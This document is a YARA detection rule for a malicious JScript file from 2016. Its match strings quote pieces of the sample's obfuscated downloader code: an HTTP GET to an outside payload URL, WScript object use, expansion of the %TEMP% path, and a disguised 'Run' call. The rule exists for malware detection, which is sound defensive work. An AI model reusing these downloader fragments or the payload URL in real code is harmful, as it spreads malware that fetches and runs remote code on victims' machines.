rule sig_20160428_0aa79b5f82cf8359727d4e37bfbe4af3 {
  meta:
    description = "datamaliciousorder - file 20160428_0aa79b5f82cf8359727d4e37bfbe4af3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2adb7dcacb2173461e6b4a3f96df73c9a12bd8c41066b9bdeb59ecf461d308c7"

  strings:
    $s1  = "OlrKlbWewVblYqbEgeAww[WjnGjdGxdAntZnyVjqUxs](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function MuyVqxJfuRelXgvTjsQai(YfbEumXolOlwCxdZztWaa){TwhAgkJnuMnwNqeHidRbs[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function OpcZnvHheJgpWcgLvkSwn() {return TwhAgkJnuMnwNqeHidRbs[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function MuyVqxJfuRelXgvTjsQai(YfbEumXolOlwCxdZztWaa){TwhAgkJnuMnwNqeHidRbs[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "return KfrDedYlzHimYmwTntGph - KveYngOgrXkaTeaMxwVif;};" fullword ascii
    $s6  = "var TwhAgkJnuMnwNqeHidRbs = function HzfBquQxwYsiAicBbqPcr() {return DqbEwbCndWbsQzxOreFhm[LmvIvqUqiFbnNibObuYpd](\"WScript\"+\"" ascii
    $s7  = "var TwhAgkJnuMnwNqeHidRbs = function HzfBquQxwYsiAicBbqPcr() {return DqbEwbCndWbsQzxOreFhm[LmvIvqUqiFbnNibObuYpd](\"WScript\"+\"" ascii
    $s8  = "var DqbEwbCndWbsQzxOreFhm = this[\"WScript\"];" fullword ascii
    $s9  = "function OpcZnvHheJgpWcgLvkSwn() {return TwhAgkJnuMnwNqeHidRbs[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function KgjVioNufDwgXfzZgdAbs(){return BjlUlwKjpZgfJjwTfwHvv + \"\";};" fullword ascii
    $s11 = "if (OlrKlbWewVblYqbEgeAww[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function BikQeyOefJjcAsrLouMxz(KfrDedYlzHimYmwTntGph, KveYngOgrXkaTeaMxwVif){IcvPlqIwnBrmYpiLflEyd = IcvPlqIwnBrmYpiLflEyd * 1; " ascii
    $s13 = "function GytTubRygKkuNsgHqrIbc()" fullword ascii
    $s14 = "var VgjLmsJwlNqnTfvFpoEao = false;" fullword ascii
    $s15 = "function KlkWamWrzQcrIlkHslQno(){return LmvIvqUqiFbnNibObuYpd;};" fullword ascii
    $s16 = "}while (VhnKtxCgeMudYqjJbfGnn);" fullword ascii
    $s17 = "function OzhNnfXvnPnhDbzHpzOxo(){return 23;};" fullword ascii
    $s18 = "function LwxQfeUywSesTixFasRro(WxvZjfFmoQmwMdkUsgZtr) {var FssYufOguKevShlVbjSla = (1, 2, 3, 4, 5, WxvZjfFmoQmwMdkUsgZtr); retur" ascii
    $s19 = "function LwxQfeUywSesTixFasRro(WxvZjfFmoQmwMdkUsgZtr) {var FssYufOguKevShlVbjSla = (1, 2, 3, 4, 5, WxvZjfFmoQmwMdkUsgZtr); retur" ascii
    $s20 = "VgjLmsJwlNqnTfvFpoEao = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}